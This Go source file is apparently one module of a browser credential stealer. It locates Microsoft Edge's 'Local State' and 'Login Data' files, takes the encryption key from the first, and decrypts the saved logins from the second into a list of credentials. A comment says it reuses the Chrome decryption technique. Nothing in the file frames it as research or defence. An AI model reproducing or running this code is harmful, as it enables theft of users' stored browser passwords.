package browsers

import (
	"fmt"
)

var (
	EDGE_PATH_LOCAL_STATE = fmt.Sprintf("%s/Microsoft/Edge/User Data/Local State", LOCALAPPDATA)
	EDGE_PATH_LOGIN_DATA  = fmt.Sprintf("%s/Microsoft/Edge/User Data/Default/Login Data", LOCALAPPDATA)
)

// USES SAME DECRYPTION TECHNIQUE AS CHROME

func Edge() []Credential {
	credentials := []Credential{}

	secretKey, err := getSecretKey(EDGE_PATH_LOCAL_STATE)
	if err != nil {
		fmt.Println(err.Error())
		return credentials
	}
	err = getLoginData("Edge", EDGE_PATH_LOGIN_DATA, secretKey, &credentials)
	if err != nil {
		fmt.Println(err.Error())
		return credentials
	}

	return credentials
}
